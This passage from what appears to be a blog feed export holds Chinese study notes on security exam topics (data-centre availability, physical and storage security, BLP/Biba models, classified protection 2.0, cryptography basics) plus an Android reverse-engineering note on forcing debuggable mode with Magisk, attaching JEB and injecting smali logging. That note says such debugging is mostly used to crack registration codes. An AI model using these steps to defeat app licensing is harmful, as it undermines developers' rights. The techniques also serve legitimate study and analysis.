encoding="application/x-tex">CO_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>﻿/﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>N</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">N_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>﻿导致缺氧）</li></ul></li></ul><h3 id="互联网数据中心-idc">互联网数据中心（IDC）</h3><p><img src="https://image.icewindy.cn/2025/08/a72c92b4ff45c7558b40149ad5eff9f7.png" alt="image-20250801160752013"></p><ul><li>核心定义：<strong>向用户提供资源出租</strong>（计算/存储/网络）、IT平台租用、应用软件租用服务的基础设施。</li><li>功能模块：<ul><li>机房基础设施（建筑/供电/空调/消防/安防等动力环境）</li><li>网络系统（交换机/路由器等）</li><li>资源系统（服务器/存储/网络资源池）</li><li>业务系统（软件应用服务）</li><li>安全系统（左侧模块）</li><li>管理系统（右侧模块）</li></ul></li></ul><h4 id="idc与云计算的关系">IDC与云计算的关系</h4><ul><li>类比说明：云计算如同餐厅点餐服务（按需提供计算资源），IDC是支撑云计算的&quot;厨房&quot;（物理基础设施），没有IDC的云计算如同无厨房的餐厅无法运作。</li></ul><h4 id="分级标准">分级标准</h4><ul><li>R1级：基础冗余，可用性≥99.5%</li><li>R2级：完全冗余，可用性≥99.9%</li><li>R3级：容错能力，可用性≥99.99%</li></ul><h4 id="可用性量化指标">可用性量化指标</h4><p>等级定义：</p><ul><li>1个9（90%）：年宕机36.5天</li><li>2个9（99%）：年宕机87.6小时</li><li>3个9（99.9%）：年宕机8.76小时（电信级基础标准）</li><li>4个9（99.99%）：年宕机52.6分钟</li><li>5个9（99.999%）：年宕机5.26分钟（高可用标准）</li></ul><h4 id="idc机房强制要求">IDC机房强制要求</h4><ul><li>抗震要求：7度以上抗震设防区，电信设备需通过抗震检测</li><li>施工前检查：<ul><li>配备有效消防器材，消防系统完工可用</li><li>孔洞需用非燃材料封堵（防鼠患）</li><li>严禁存放易燃易爆物品</li><li>不同电压设备/插座需明确标识</li></ul></li></ul><h2 id="通信线路-设备-存储介质安全">通信线路/设备/存储介质安全</h2><h3 id="网络通信线路安全分析与防护">网络通信线路安全分析与防护</h3><h4 id="网络通信线路物理威胁">网络通信线路物理威胁</h4><p>主要威胁类型：</p><ul><li>线路切断：如支付宝光纤被挖掘机挖断导致大面积服务中断</li><li>电磁干扰：主要影响网线传输，光纤不受此影响</li><li>信息泄露：包括线路监听、窃听等被动攻击手段</li></ul><h4 id="线路安全防护">线路安全防护</h4><ul><li>冗余设计：<ul><li>设备冗余：关键设备采用双机热备</li><li>线路冗余：双上行链路设计（如图中路由器双上行），单点故障不影响全网通信</li></ul></li><li>电磁防护：<ul><li>屏蔽措施：使用屏蔽机房、屏蔽网线</li><li>介质替换：将易受干扰的网线更换为光纤</li></ul></li><li>加密防护：<ul><li>传输加密：应用密码学技术（如第三章所述），使窃听数据无法还原</li></ul></li></ul><h3 id="设备实体安全分析与防护">设备实体安全分析与防护</h3><h4 id="设备实体安全分析">设备实体安全分析</h4><p>安全威胁：</p><ul><li>环境关联威胁：如机房水浸导致设备损坏</li><li>物理破坏：设备被盗或人为损坏</li><li>电磁干扰：大功率雷达站等强磁场影响</li><li>供应链风险：如华为被断供芯片案例</li><li>固件攻击：针对BIOS、基带等固件的攻击</li><li>硬件漏洞：如硬件木马、芯片后门</li><li>控制组件威胁：如伊朗核设施震网病毒攻击案例</li><li>非法外联：内网设备违规连接互联网</li></ul><p>防护措施：</p><ul><li>设备的标志和标记</li><li>设备电磁辐射防护</li><li>设备静电及用电安全防护</li><li>设备磁场抗扰</li><li>设备环境安全保护</li><li>设备适应性与可靠性保护</li></ul><p>增强型保护措施：</p><ul><li>供应链弹性</li><li>安全质量保障</li><li>安全合规</li><li>安全审查</li></ul><h4 id="设备硬件攻击防护">设备硬件攻击防护</h4><ul><li><p>硬件木马检测技术：</p><ul><li><strong>反向分析</strong>：通过逆向工程重建电路图比对原始设计（类似哈希校验原理）</li><li><strong>功耗分析</strong>：对比芯片实际功耗与理论值的差异（如1W→10W异常）</li><li><strong>侧信道分析</strong>：监测功率、时序、电磁等多参数变化（如图5-6流程）</li></ul><p><img src="https://image.icewindy.cn/2025/08/ebb3616b1bfc562ce201e0a8382c6e52.png" alt="image-20250801174044637"></p></li><li><p>漏洞处理原则：</p><ul><li>不可逆性：硬件漏洞无法像软件打补丁修复</li><li>条件破坏：封堵漏洞利用路径（如禁用特定内存地址）</li></ul></li></ul><h3 id="存储介质安全分析与防护">存储介质安全分析与防护</h3><h4 id="存储介质安全分析">存储介质安全分析</h4><ul><li>五大风险：<ul><li>管理失控：介质随意存放、无专人管理</li><li>数据泄露：未加密存储导致信息外泄</li><li>设备故障：磁盘损坏等硬件问题</li><li>删除残留：非安全删除导致数据恢复（如三酷跑路案例）</li><li>恶意代码：通过存储介质传播病毒</li></ul></li></ul><h4 id="存储介质安全防护">存储介质安全防护</h4><ul><li>管理措施：<ul><li>专人专区：设立专用存放区域并专人管理</li><li>审批登记：介质借用需完整审批流程</li><li>分类备份：重要数据至少备份3份（本地2份+异地1份）</li><li>报废处理：物理销毁含敏感数据的报废介质</li></ul></li><li>技术措施：<ul><li>存储加密：对敏感数据进行加密存储</li><li>容灾技术：<ul><li><strong>磁盘阵列</strong>：采用RAID1/RAID5等冗余技术</li><li><strong>双机热备</strong>：HA高可用集群保障业务连续性</li><li><strong>离线备份</strong>：磁带库等冷存储方式（抗攻击性强）</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 软考 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android逆向（4）：动态调试、log插桩</title>
      <link href="/2025/07/29/Android%E9%80%86%E5%90%91%EF%BC%884%EF%BC%89%EF%BC%9A%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E3%80%81log%E6%8F%92%E6%A1%A9/"/>
      <url>/2025/07/29/Android%E9%80%86%E5%90%91%EF%BC%884%EF%BC%89%EF%BC%9A%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E3%80%81log%E6%8F%92%E6%A1%A9/</url>
      
        <content type="html"><![CDATA[<h2 id="动态调试">动态调试</h2><p>动态调试是指自带的调试器跟踪自己软件的运行，可以在调试的过程中知道参数或者局部变量的值以及履清代码运行的先后顺序。多用于爆破注册码。</p><h2 id="动态调试步骤">动态调试步骤</h2><h3 id="修改debug权限">修改debug权限</h3><ol><li><p>在AndroidManifest.xml里添加可以调试的权限</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android:debuggable=&quot;true&quot;</span><br></pre></td></tr></table></figure></li><li><p>XappDebug模块</p></li><li><p>Magisk命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.  adb shell #adb进入命令行模式</span><br><span class="line">2.  su #切换至超级用户</span><br><span class="line">3.  magisk resetprop ro.debuggable 1</span><br><span class="line">4.  stop;start; #一定要通过该方式重启</span><br></pre></td></tr></table></figure></li><li><p>MagiskHide Props Config模块</p></li></ol><h3 id="开启adb调试">开启adb调试</h3><p>模拟器直接在设置中开启</p><p><img src="https://image.icewindy.cn/2025/07/8680e9e47bcd34ffee819590a8b457c8.png" alt="image-20250729164106368"></p><p>手机点击版本号多次后开启开发者模式后进入开启ADB调试</p><h3 id="debug模式启动">debug模式启动</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -D -n com.zj.wuaipojie/.ui.MainActivity</span><br></pre></td></tr></table></figure><ul><li>adb shell am start -D -n 包名/类名<ul><li>-n 表示启动一个activity</li><li>-D 表示将应用设置为可调试模式</li></ul></li></ul><h3 id="jeb附加调试进程">Jeb附加调试进程</h3><p>接着使用Jeb附加调试进程，打上断点就可以调试了。常见快捷键：</p><ul><li>^F6进入方法</li><li>F6跳过方法</li><li>F7从方法中跳出来</li><li>R运行到光标处</li></ul><h2 id="log插桩">Log插桩</h2><p>定义：Log插桩指的是反编译APK文件时，在对应的smali文件里，添加相应的smali代码，将程序中的关键信息，以log日志的形式进行输出。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-static &#123;对应寄存器&#125;, <span class="class">Lcom/mtools/LogUtils;</span>-&gt;v(<span class="class">Ljava/lang/Object;</span>)V</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 移动安全 </category>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 移动安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全工程师软考（4）：网络安全体系与模型</title>
      <link href="/2025/07/24/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%884%EF%BC%89%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%93%E7%B3%BB%E4%B8%8E%E6%A8%A1%E5%9E%8B/"/>
      <url>/2025/07/24/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%884%EF%BC%89%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%93%E7%B3%BB%E4%B8%8E%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="概述">概述</h2><img src="https://image.icewindy.cn/2025/07/eb474358276b7b05a9070031c5e14efc.png" alt="image-20250724151954533" style="zoom: 50%;" /><h2 id="网络安全模型">网络安全模型</h2><h3 id="blp模型">BLP模型</h3><ul><li><p>Bell-LaPadula模型（BLP）是机密性模型，用于<strong>防止非授权信息的扩散</strong>，该模型包含两个特性：<strong>简单安全特性和*特性</strong>。概括：<strong>上写下读</strong>。</p></li><li><p>简单安全特性:</p><ul><li><strong>读访问</strong>条件：主体安全级≥客体安全级，且主体范畴集包含客体全部范畴</li><li>操作限制：<strong>只能向下读，不能向上读</strong></li></ul></li><li><p>*特性：</p><ul><li><p><strong>写访问</strong>条件：客体安全级≥主体安全级，且客体范畴集包含主体全部范畴</p></li><li><p>操作限制：<strong>只能向上写，不能向下写</strong></p></li></ul></li><li><p>局限性：<strong>只能保障机密性，不能保障完整性</strong></p></li><li><p>BLP机密性模型<strong>可用于实现军事安全策略</strong>，美国国防部为保护计算机机密信息提出的限制策略。</p></li><li><p>策略规定：用户要合法读取某信息，当且仅当<strong>用户安全级大于等于该信息的安全级，并且用户的访问范畴包含改信息范畴时</strong>。</p><ul><li>安全级划分: 公开&lt;秘密&lt;机密&lt;绝密（线性有序）</li><li>范畴集定义: 信息所属领域（如人事处、财务处等职能部门）</li><li>典型案例:<ul><li>文件F：{机密：人事处，财务处}</li><li>用户A：{绝密：人事处} → 不可读F（缺少财务处范畴）</li><li>用户B：{绝密：人事处，财务处，科技处} → 可读F（满足全部条件）</li></ul></li></ul></li></ul><h3 id="biba模型">Biba模型</h3><ul><li>Biba完整性模型，主要用于防止<strong>非授权修改</strong>系统信息，以保证系统的信息<strong>完整性</strong>。拥有三个特性：*<em>简单安全性、<em>特性和调用特性</em></em>。概括：<strong>上读下写</strong></li><li>简单安全特性:<ul><li><strong>修改访问</strong>条件：主体安全级≥客体安全级，且主体范畴集包含客体全部范畴</li><li>操作限制：<strong>不能向下读（低完整性数据），但可向下写</strong></li></ul></li><li>*特性：<ul><li>禁止主体完整性级&lt;客体完整性级时修改客体</li><li>操作限制：<strong>不能向上写</strong>（低完整性主体修改高完整性数据）</li></ul></li><li>调用特性：<ul><li>禁止低完整性主体调用高完整性主体</li></ul></li></ul><h3 id="信息流模型">信息流模型</h3><ul><li><p><strong>访问控制模型</strong>的一种变形，简称FM。</p></li><li><p>数学表示:<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>M</mi><mo>=</mo><mo stretchy="false">(</mo><mi>N</mi><mo separator="true">,</mo><mi>P</mi><mo separator="true">,</mo><mi>S</mi><mi>C</mi><mo separator="true">,</mo><mo>⊗</mo><mo separator="true">,</mo><mo>→</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FM = (N,P,SC,\otimes,\rightarrow)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">⊗</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mclose">)</span></span></span></span>﻿（非重点内容）</p><ul><li><p>符号含义:</p><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span></span></span></span>﻿: 客体集合</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span></span></span></span>﻿: 进程集合</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>C</mi></mrow><annotation encoding="application/x-tex">SC</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span></span></span></span>﻿: 安全类型集合</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊗</mo></mrow><annotation encoding="application/x-tex">\otimes</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">⊗</span></span></span></span>﻿: 支持结合、交换的二进制运算符</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span>﻿: 流关系</li></ul></li><li><p>安全判定: 当且仅当执行操作后不会导致流与流关系冲突</p></li></ul></li><li><p>信息流模型的应用：<strong>分析隐蔽通道</strong></p><ul><li>主要功能: 防止敏感信息通过隐蔽通道泄露</li><li><strong>隐蔽通道表现:</strong> 低安全等级主体对高安全等级主体信息的间接读取</li></ul></li></ul><h3 id="信息保障模型">信息保障模型</h3><p>考点：英文缩写全称</p><ul><li><p><strong>PDRR模型</strong></p><ul><li><p>Protection(保护): 加密、数字签名、访问控制等</p></li><li><p>Detection(检测): 入侵检测、脆弱性扫描等</p></li><li><p>Recovery(恢复): 数据备份、系统恢复等</p></li><li><p>Response(响应): 应急策略、安全评估等</p></li></ul></li><li><p><strong>P2DR模型</strong>：相比PDRR增加安全策略维度</p><ul><li>Policy(安全策略)</li><li>Protection(防护)</li><li>Detection(检测)</li><li>Response(响应)</li></ul></li><li><p><strong>WPDRRC模型</strong></p><ul><li><p>Warning(预警)</p></li><li><p>Protection(保护)</p></li><li><p>Detection(检测)</p></li><li><p>Recovery(恢复)</p></li><li><p>Response(响应)</p></li><li><p>Counterattack(反击)</p></li></ul></li></ul><h3 id="能力成熟度模型">能力成熟度模型</h3><p>对一个<strong>组织机构的能力进行成熟度评估</strong>，分为五级：</p><ol><li>非正式执行(随机无序)</li><li>计划跟踪(主动非体系化)</li><li>充分定义(正式规范)</li><li>量化控制(可量化)</li><li>持续优化(可持续)</li></ol><p><strong>安全相关变体：</strong></p><ul><li><strong>SSE-CMM系统安全工程能力成熟度模型</strong>: 包含<strong>工程过程类、组织过程类、项目过程类</strong>。</li><li><strong>数据安全成熟度模型</strong>: <strong>组织建设、制度流程、技术工具及人员能力</strong>四个维度评估</li><li><strong>软件安全成熟度模型</strong>分级:<ul><li>1级: 补丁修补</li><li>2级: 渗透测试+代码评审</li><li>3级: 漏洞评估+编码标准</li><li>4级: 风险识别+SDLC检查点</li><li>5级: 风险覆盖+差距分析</li></ul></li></ul><h3 id="其他安全模型">其他安全模型</h3><ul><li><p>纵深防御模型：</p><ol><li>安全保护</li><li>安全监测</li><li>实时响应</li><li>恢复</li></ol></li><li><p>分层防护模型：参考OSI模型，对保护对象进行层次化保护。</p></li><li><p>等级保护模型：将信息系统划分为不同安全保护等级，采取相对应的保护措施。</p></li><li><p>网络生存模型：</p><ul><li><p>设计目标: 受攻击时仍能维持基本服务</p></li><li><p>遵循3R策略:</p><ul><li>Resist(抵抗)</li><li>Recognize(识别)</li><li>Recover(恢复)</li></ul></li></ul></li></ul><h2 id="网络安全原则">网络安全原则</h2><ul><li>系统性和动态性原则<ul><li>整体安全性: 强调&quot;<strong>木桶原则</strong>&quot;，即网络安全性取决于最薄弱的环节，需要强调整体性的安全防护。</li><li><strong>适时而变</strong>: 网络安全策略需要根据系统的安全环境和攻击态势动态变化，不能一成不变。</li></ul></li><li>纵深防护与协作性原则<ul><li>技术互补: 各种网络安全技术应该相互补充、相互配合，形成协同防御体系。</li><li>防护体系: 完整的网络安全体系应包括安全评估、安全防护、安全监测和安全应急响应四个关键环节。</li></ul></li><li>网络安全风险和分级保护原则<ul><li>平衡关系: 需要正确处理安全需求、风险与代价的关系，做到安全性与可用性相容。</li><li>分级防护: 根据网络资产的安全级别（如等保二级、三级、四级）采取相应的防护措施。</li><li><strong>适度防护</strong>: 安全防护并非越严格越好，需要平衡安全性和易用性。例如Windows Vista因过度安全导致使用不便，而Windows 7因适度防护获得广泛应用。</li></ul></li><li>标准化与一致性原则</li><li>技术与管理相结合原则</li><li>安全第一，预防为主原则</li><li>安全与发展同步原则</li><li>人机物融合和产业发展原则</li></ul><h2 id="体系框架与建设内容">体系框架与建设内容</h2><img src="https://image.icewindy.cn/2025/07/aace6420ddb35c25c95bb620673f5df5.png" alt="image-20250724164647230" style="zoom:50%;" /><h3 id="网络安全组织">网络安全组织</h3><ul><li><p>组织架构层次</p><ul><li><p><strong>领导层</strong>：由各部门领导组成</p><ul><li><p>核心职责：</p><ul><li>协调跨部门工作</li><li>审批安全策略与项目预算</li><li>人员考察录用</li></ul></li><li><p>特点：不直接参与具体实施，负责顶层设计与资源调配</p></li></ul></li><li><p><strong>管理层</strong>：安全负责人+中层管理人员（如网络中心主任）</p><ul><li><p>核心职能：</p><ul><li>制定安全策略与预算计划（需报领导层审批）</li><li>建立安全工作流程</li><li>监督项目实施与日常维护</li></ul></li><li><p>工作特点：承上启下的枢纽作用，兼具规划与监督职能</p></li></ul></li><li><p><strong>执行层</strong>：业务/技术人员+系统管理员+工程人员</p><ul><li><p>具体工作：</p><ul><li>落实安全策略与规章制度</li><li>设备运维与日常安全检查</li><li>严格遵循既定工作流程</li></ul></li><li><p>实施特点：实际操作层面，需多方协作（含甲方、集成商、厂商人员）</p></li></ul></li><li><p><strong>外部协作层</strong>：安全专家+合作伙伴</p><ul><li><p>服务内容：</p><ul><li>提供最新安全趋势分析</li><li>开展安全管理培训</li><li>参与风险分析与建设方案评审</li></ul></li><li><p>协作模式：以项目制形式参与安全建设</p></li></ul></li></ul></li><li><p>组织运作特点</p><ul><li>层级关系：自上而下的审批流程（如预算需经管理层制定→领导层批准）</li><li>监督机制：管理层对执行层工作实施双重监督（项目进度+日常维护）</li><li>协作特点：重大项目常采用&quot;甲方+集成商+厂商+专家&quot;的联合工作组模式</li><li>决策机制：重大事项需集体决策（如党组会讨论大额预算合理性）</li></ul></li></ul><h3 id="安全管理">安全管理</h3><ul><li><p>五大要素：包含管理目标、管理手段、管理主体、管理依据和管理资源，构成完整管理体系框架】</p></li><li><p>目标分类：</p><ul><li>大目标：政治/经济/文化/国防安全</li><li>小目标：网络系统保密性©/完整性(I)/可用性(A)/可控性</li></ul></li><li><p>手段组成：安全评估/监管/应急响应/协调/标准规范/保密检查/认证访问控制</p></li><li><p>管理依据：宪法&gt;法律&gt;法规&gt;部门规章&gt;技术规范</p></li><li><p>管理主体</p><ul><li>宏观层面：国家网络安全职能部门（如网信办、公安部等）</li><li>微观层面：网络管理员/单位负责人（实操中网管承担主要执行工作）</li><li>管理特点：需具备全局视角，不仅管理设备更要统筹人员/经费等资源</li></ul></li><li><p>管理资源</p><ul><li>四类资源：<ul><li>硬件：防火墙等安全设备</li><li>人力：运维团队（含外包/驻场人员）</li><li>财力：安全预算编制与审批流程</li><li>时间：项目建设周期管理（如交付节点）</li></ul></li><li>管理要点：甲方信息中心主任需掌握资源调配能力，特别是经费申请与使用规划</li></ul></li><li><p>人员安全管理</p><ul><li>核心目标：降低人为风险（误操作/内部威胁/权限滥用等）</li><li>三大原则：<ul><li><strong>多人负责</strong>：如财务双人复核制</li><li><strong>任期有限</strong>：参照政府官员任期制度</li><li><strong>职责分离</strong>：典型如财务/出纳分权制衡</li></ul></li></ul></li></ul><h3 id="网络安全等级保护2-0">网络安全等级保护2.0</h3><ul><li><p>分级依据：<strong>系统重要性+破坏后危害程度</strong>双重维度</p></li><li><p>级别特征：</p><ul><li><p>一级：仅影响个体权益（实际项目罕见）</p></li><li><p>二级：影响社会秩序（县医院/区法院典型场景）</p></li><li><p>三级：危害公共利益/国家安全（80%项目采用）</p></li><li><p>四级：特别严重损害（金融/电力系统适用）</p></li><li><p>五级：涉及国家核心机密（转用分级保护体系）</p><img src="https://image.icewindy.cn/2025/07/0ead61e8c6e48689fe3858be0d927695.png" alt="image-20250724172611478" style="zoom: 50%;" /></li></ul></li><li><p>等保项目流程：四阶段模型：</p><img src="https://image.icewindy.cn/2025/07/34a3cd23f8755dd7e523da9e366643ec.png" alt="image-20250724173120036" style="zoom:50%;" /><ul><li>定级备案：需公安网安部门审核（厂商可提供咨询服务）</li><li>建设整改：按标准进行差距分析与改造</li><li>等级测评：第三方机构评估（三级每年测评）</li><li>运维监督：持续检查与年度复测</li></ul></li><li><p>等保标准变化</p><p><img src="https://image.icewindy.cn/2025/07/d6457411bd563c7f6f16ee4fc2d23e19.png" alt="image-20250724173510775"></p><ul><li><p>技术架构：</p><ul><li>1.0：物理/网络/主机/应用/数据五层面</li><li>2.0：&quot;一个中心三重防护&quot;体系（管理中心+通信网络/区域边界/计算环境）</li></ul></li><li><p>管理要求：</p><ul><li>新增安全策略制度/建设运维管理等模块</li><li>强调全生命周期安全管理</li></ul></li></ul></li><li><p>等保2.0变化</p><ul><li>扩展领域：&quot;云大物工&quot;新技术覆盖（云计算/大数据/物联网/工业控制）</li><li>提出了在“安全通信网络”“安全区域边界”“安全计算环节”和“安全管理中心”支持下的三重防护体系架构</li><li>强化了<strong>可信计算技术使用</strong>的要求，新增可信验证：<ul><li>一级：引导程序、系统程序</li><li>二级：重要配置参数和应用程序</li><li>三级：动态验证关键执行环节</li><li>四级：全环节动态验证</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 软考 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全工程师软考（3）：密码学</title>
      <link href="/2025/07/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%883%EF%BC%89%EF%BC%9A%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
      <url>/2025/07/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%883%EF%BC%89%EF%BC%9A%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<h2 id="密码学基础">密码学基础</h2><p><strong>组成结构</strong>：密码编码和密码分析</p><p><strong>相关法律</strong>：</p><ul><li>《密码法》实施时间：2020年1月1日（重点记忆）</li><li>《电子签名法》实施时间：2005年4月1日（了解即可）</li></ul><h3 id="密码安全分析">密码安全分析</h3><ul><li><p>唯密文攻击：</p><ul><li>条件：仅掌握一个/多个同密钥加密的密文</li><li>特点：攻击难度最大（如截获加密文件但无其他信息）</li></ul></li><li><p>已知明文攻击：</p><ul><li>条件：已知部分明文-密文对</li><li>特点：合格密码需能抵御此类攻击</li></ul></li><li><p>选择明文攻击：</p><ul><li>条件：可自主选择明文并获取对应密文</li><li>特点：对攻击者最有利，适用于攻击文件/数据库系统</li></ul></li><li><p>密文验证攻击：</p><ul><li>条件：可验证任意密文是否合法</li><li>特点：仅能判断合法性（Yes/No），无法获取内容</li></ul></li><li><p>选择密文攻击：</p><ul><li>条件：可选择密文并获取对应明文</li><li>特点：主要攻击公钥密码体制（特别是数字签名系统）</li></ul></li></ul><h3 id="密码体制分类">密码体制分类</h3><ul><li>对称密码体制（私钥密码体制）<ul><li>核心特征：加密/解密使用相同密钥</li><li>密钥管理：<ul><li>必须通过安全渠道交换密钥</li><li>密钥数量：n(n-1)/2（1000用户需约50万对密钥）</li></ul></li><li>典型算法：DES（56位）、3DES（112位）、AES、RC4/5、IDEA</li><li>优势：加解密速度快、密文紧凑、长密钥难破解</li><li>缺陷：密钥分发困难（需安全信道）、密钥管理复杂（用户量大密钥数量也大）、无法认证源</li></ul></li><li>非对称体制（公钥密码体制）<ul><li>核心特征：加密/解密使用不同密钥</li><li>密钥管理：<ul><li>每个实体持有公钥+私钥</li><li>密钥数量：2n（1000用户2000密钥）</li></ul></li><li>应用模式：<ul><li>保密通信：公钥加密-&gt;私钥解密</li><li>数字签名：私钥加密-&gt;公钥解密</li></ul></li><li>优势：密钥分发方便、密钥保管量少、支持数字签名</li><li>缺陷：加密速度慢、数据膨胀率高</li><li>典型算法：RSA、RCC、DH等</li></ul></li><li>混合密码体制<ul><li>设计原理：结合对称与非对称密码优势</li><li>工作流程：<ul><li>发送方用<strong>对称密钥加密消息</strong>，用接收方<strong>公钥加密对称密钥</strong>（数字信封）</li><li>组合发送<strong>加密消息+数字信封</strong></li><li>接收方先用<strong>私钥解密获得对称密钥</strong>，再用<strong>对称密钥解密获得明文</strong></li></ul></li></ul></li></ul><img src="https://image.icewindy.cn/2025/07/7570179e247e9c6a700fc92722358ec8.png" alt="image-20250723103329084" style="zoom:50%;" /><h2 id="对称加密算法">对称加密算法</h2><p><img src="https://image.icewindy.cn/2025/07/2f9a242f1e4ec580b8c1bdc922d0bc64.png" 